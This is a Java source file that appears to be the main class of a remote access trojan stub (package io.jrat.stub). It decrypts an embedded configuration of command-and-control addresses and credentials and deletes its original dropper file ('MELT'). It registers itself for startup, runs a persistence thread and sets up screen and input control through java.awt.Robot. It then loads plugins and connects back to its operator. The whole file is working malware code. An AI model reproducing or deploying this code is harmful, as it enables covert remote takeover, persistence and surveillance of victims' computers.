package io.jrat.stub;

import io.jrat.common.OperatingSystem;
import io.jrat.common.crypto.Crypto;
import io.jrat.stub.utils.Utils;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Robot;
import java.awt.SystemTray;
import java.awt.TrayIcon;
import java.io.File;
import java.io.InputStream;
import java.util.Date;
import java.util.HashMap;

import javax.swing.ImageIcon;


public class Main {

	public static String[] addresses;
	public static String id;
	public static String pass;
	public static byte[] encryptionKey;
	public static long reconnectSeconds;
	public static String name;
	public static boolean running = true;
	public static Robot robot;
	public static String date;
	public static int timeout;
	public static TrayIcon icon;
	public static HashMap<String, String> config;
	public static Robot[] robots;
	public static boolean errorLogging = false;
	public static boolean debugMessages = true;
	public static boolean encryption = true;

	public static void main(String[] args) {
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
				System.setProperty("apple.awt.UIElement", "true");
			}

			robot = new Robot();

			InputStream keyFileInputStream = Main.class.getResourceAsStream("/key.dat");
			byte[] keyBuffer = new byte[keyFileInputStream.available()];
			keyFileInputStream.read(keyBuffer);
			encryptionKey = keyBuffer;

			InputStream configFileInputStream = Main.class.getResourceAsStream("/config.dat");
			byte[] configBuffer = new byte[configFileInputStream.available()];
			configFileInputStream.read(configBuffer);
			String rawConfigFile = new String(Crypto.decrypt(configBuffer, Main.getKey()));

			File filetodelete = null;

			config = new HashMap<String, String>();

			String[] configr = rawConfigFile.trim().split("SPLIT");

			for (int i = 0; i < configr.length; i++) {
				String str = configr[i];
				String ckey = str.substring(0, str.indexOf("=")).trim();

				String cval = str.substring(str.indexOf("=") + 1, str.length()).trim();

				config.put(ckey, cval);
			}

			addresses = config.get("addresses").split(",");
			id = config.get("id");
			pass = config.get("pass");
			reconnectSeconds = Long.parseLong(config.get("reconsec"));
			name = config.get("name");
			errorLogging = Boolean.parseBoolean(config.get("error"));
			debugMessages = Boolean.parseBoolean(config.get("debugmsg"));

			if (Boolean.parseBoolean(config.get("mutex"))) {
				new Mutex(Integer.parseInt(config.get("mport"))).start();
			}

			String allowedOperatingSystems = config.get("os");

			boolean shutdown = true;

			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && allowedOperatingSystems.contains("win")) {
				shutdown = false;
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX && allowedOperatingSystems.contains("mac")) {
				shutdown = false;
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX && allowedOperatingSystems.contains("linux")) {
				shutdown = false;
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.FREEBSD && allowedOperatingSystems.contains("freebsd")) {
				shutdown = false;
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OPENBSD && allowedOperatingSystems.contains("openbsd")) {
				shutdown = false;
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.SOLARIS && allowedOperatingSystems.contains("solaris")) {
				shutdown = false;
			}

			if (shutdown) {
				System.exit(0);
			}

			if (Boolean.parseBoolean(config.get("timeout"))) {
				timeout = Integer.parseInt(config.get("toms"));
			} else {
				timeout = 1000 * 15;
			}

			if (args.length > 0) {
				if (args[0].trim().equals("MELT")) {
					String path = args[1];
					filetodelete = new File(path.replace("\"", "").trim());
				}
			}

			String currentJar = Utils.getJarFile().getAbsolutePath();

			try {
				Startup.addToStartup(name);
			} catch (Exception e) {
				e.printStackTrace();
			}

			if (filetodelete != null) {
				while (filetodelete.exists()) {
					try {
						filetodelete.delete();
					} catch (Exception ex) {
						try {
							Thread.sleep(1000L);
						} finally {
						}
					}
				}
			}

			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && currentJar.startsWith("/")) {
				currentJar = currentJar.substring(1, currentJar.length());
			}

			File f = new File(currentJar);
			if (f.exists()) {
				Date da = new Date(f.lastModified());
				Main.date = da.toString();
			}

			try {
				Plugin.load();
			} catch (Exception e1) {
				e1.printStackTrace();
			}

			if (Boolean.parseBoolean(config.get("ti"))) {
				if (SystemTray.isSupported()) {
					SystemTray tray = SystemTray.getSystemTray();
					icon = new TrayIcon(new ImageIcon(Main.class.getResource("/icon.png")).getImage(), config.get("tititle"), null);
					tray.add(icon);
				}
			}

			if (Boolean.parseBoolean(config.get("per"))) {
				new Persistance(Integer.parseInt(config.get("perms"))).start();
			}

			GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
			robots = new Robot[devices.length];
			for (int i = 0; i < devices.length; i++) {
				robots[i] = new Robot(devices[i]);
			}

			for (Plugin plugin : Plugin.list) {
				plugin.methods.get("onstart").invoke(plugin.instance, new Object[] {});
			}

			new Thread(new Connection()).start();
		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	public static String getPass() {
		return pass;
	}

	public static String[] getAddresses() {
		return addresses;
	}

	public static String getID() {
		return id;
	}

	public static byte[] getKey() {
		return encryptionKey;
	}

	public static String debug(Object s) {
		if (!debugMessages) {
			return null;
		}
		if (s == null) {
			s = "null";
		}
		System.out.println(s.toString());
		return s.toString();
	}

}
